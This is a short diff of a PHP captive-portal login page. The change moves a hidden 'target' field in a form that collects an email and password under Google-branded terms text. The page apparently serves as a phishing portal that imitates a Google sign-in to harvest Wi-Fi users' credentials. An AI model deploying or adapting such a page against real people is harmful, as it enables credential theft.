@@ -139,9 +139,9 @@ require_once('helper.php');
 
           <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">
 
-            <input type="hidden" name="target" value="<?=$destination?>">
             <input type="text" name="email" class="form-control" placeholder="Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
             <input type="password" name="password" class="form-control" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
+            <input type="hidden" name="target" value="<?=$destination?>">
             <button class="btn btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">Accept &amp; Connect</button>
             <div class="text-center terms-text1">I agree to the <a href="#" class="url-color">Terms of Service</a> and have</div>
             <div class="text-center terms-text2"> reviewed the <a href="#" class="url-color">Google Privacy Policy</a></div>
